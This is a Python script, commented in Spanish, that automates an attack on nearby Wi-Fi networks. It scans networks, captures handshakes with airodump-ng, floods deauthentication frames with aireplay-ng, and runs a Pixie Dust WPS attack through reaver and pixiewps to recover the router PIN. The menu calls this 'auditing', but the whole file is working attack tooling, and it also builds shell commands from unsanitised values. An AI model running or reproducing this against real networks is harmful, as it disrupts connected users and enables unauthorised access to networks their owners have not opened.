import subprocess
import re
import os

def run_command(command, use_sudo=False):
    """Ejecuta un comando de shell y muestra la salida"""
    if use_sudo:
        command = f"su -c '{command}'"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    
    if process.returncode == 0:
        return stdout.decode(), stderr.decode()
    else:
        print(stderr.decode())
        return stdout.decode(), stderr.decode()

def extract_value(output, key):
    """Extrae un valor de la salida del comando basado en una clave"""
    match = re.search(f"{key} ([0-9a-fA-F:]+)", output)
    return match.group(1) if match else None

def scan_wifi():
    """Escanear redes Wi-Fi cercanas"""
    print("Escaneando redes Wi-Fi...")
    resultado, _ = run_command("iw dev wlan0 scan", use_sudo=True)
    redes = []
    bssids = []
    canales = []
    for linea in resultado.split('\n'):
        if "SSID" in linea:
            essid = linea.split(':')[1].strip()
            redes.append(essid)
        if "BSS" in linea:
            bssid = linea.split()[1]
            bssid = bssid.split('(')[0]  # Limpiar el BSSID
            bssids.append(bssid)
        if "freq" in linea:
            try:
                freq = int(linea.split()[1])
                channel = int((freq - 2407) / 5)
                canales.append(channel)
            except ValueError:
                continue
    return redes, bssids, canales

def capturar_paquetes(bssid, channel):
    """Capturar paquetes de una red específica"""
    print(f"Capturando paquetes de la red con BSSID {bssid} en el canal {channel}...")
    run_command(f"airodump-ng --bssid {bssid} -c {channel} -w handshake wlan0", use_sudo=True)

def deauth_attack(bssid):
    """Realizar un ataque de desautenticación"""
    print(f"Realizando ataque de desautenticación contra {bssid}...")
    run_command(f"aireplay-ng --deauth 10 -a {bssid} wlan0", use_sudo=True)

def perform_pixie_dust_attack(bssid):
    """Realiza el ataque Pixie Dust usando reaver y pixiewps."""
    print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
    stdout, stderr = run_command(f"reaver -i wlan0 -b {bssid} -vvv --pixie-dust", use_sudo=True)

    if "PKE" in stdout and "PKR" in stdout and "E-Hash1" in stdout and "E-Hash2" in stdout:
        print("Información obtenida para Pixie Dust:")
        print(stdout)
        print("\nEjecutando pixiewps...\n")

        # Extraer los parámetros necesarios
        pke = extract_value(stdout, "PKE:")
        pkr = extract_value(stdout, "PKR:")
        ehash1 = extract_value(stdout, "E-Hash1:")
        ehash2 = extract_value(stdout, "E-Hash2:")
        authkey = extract_value(stdout, "AuthKey:")

        # Ejecutar pixiewps con los valores extraídos
        pixiewps_command = f"pixiewps -e {ehash1} -r {ehash2} -s {pke} -z {pkr} -a {authkey} -vv"
        pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=False)

        if "WPS pin:" in pixie_stdout:
            pin = extract_value(pixie_stdout, "WPS pin:")
            print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
            return pin
        else:
            print("\nPixie Dust no pudo encontrar el PIN.")
            return None
    else:
        print("\nNo se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
        print(stderr)
        return None

def main():
    # Escanear redes Wi-Fi
    redes, bssids, canales = scan_wifi()
    if redes:
        print("Redes disponibles:")
        for i, red in enumerate(redes):
            print(f"{i + 1}. {red}")
        
        seleccion = int(input("Selecciona la red que deseas auditar (número): ")) - 1
        red_seleccionada = redes[seleccion]
        bssid_seleccionado = bssids[seleccion]
        canal_seleccionado = canales[seleccion]
        
        # Limpiar la pantalla
        os.system('clear')
        
        print(f"Red seleccionada: {red_seleccionada}")
        print(f"BSSID: {bssid_seleccionado}")
        print(f"Canal: {canal_seleccionado}")
        
        capturar_paquetes(bssid_seleccionado, canal_seleccionado)
        deauth_attack(bssid_seleccionado)
        
        perform_pixie_dust_attack(bssid_seleccionado)
    else:
        print("No se encontraron redes WiFi.")

if __name__ == "__main__":
    main()






